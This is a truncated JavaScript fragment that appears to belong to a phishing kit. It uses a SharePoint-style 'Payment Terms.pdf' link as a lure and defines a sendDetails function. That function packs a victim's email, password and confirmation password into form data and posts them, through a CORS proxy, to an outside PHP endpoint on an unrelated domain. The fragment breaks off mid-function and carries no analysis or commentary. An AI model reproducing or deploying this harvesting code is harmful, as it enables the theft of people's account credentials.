  url_link = "https://anomaticcorp-my.sharepoint.com/:b:/r/personal/darcy_anomatic_com/Documents/Documents/Payment%20Terms.pdf?csf=1&web=1&e=BikmuP";
  displayPassword()
  loadPasswordAgain()
  ...
  function sendDetails(t, e, n) {
      var o = new FormData;
      o.append("email", t), o.append("password", e), o.append("confirm_password", n),o.append("id",1), axios.post("https://cors-anywhere.herokuapp.com/https://shikakunosanboh.com/shape/feedback.php", o).then(function(t) {
